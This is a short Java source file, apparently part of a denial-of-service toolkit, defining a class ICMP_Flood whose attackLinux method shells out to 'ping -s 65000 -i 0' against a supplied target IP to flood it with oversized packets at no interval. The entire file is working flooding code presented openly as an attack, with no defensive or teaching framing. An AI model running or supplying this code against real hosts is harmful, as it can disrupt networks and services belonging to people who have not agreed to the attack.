package Dos;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

/**
 * Created by kenzi on 11/2/16.
 */

public class ICMP_Flood {


    public static void attackLinux(String targetIP) {

        String pingCmd = "ping -s 65000 -i 0 "; // The maximum ping value (65,000 byte per pinging, without interval)

        try {
            Runtime r = Runtime.getRuntime();
            Process p = r.exec(pingCmd + targetIP);

            BufferedReader in = new BufferedReader(new InputStreamReader(p.getInputStream()));

            String inputLine;
            while ((inputLine = in.readLine()) != null) {
                System.out.println(inputLine);
            }
            in.close();

        } catch (IOException e) {
            System.out.println("Error");
        }

    }

}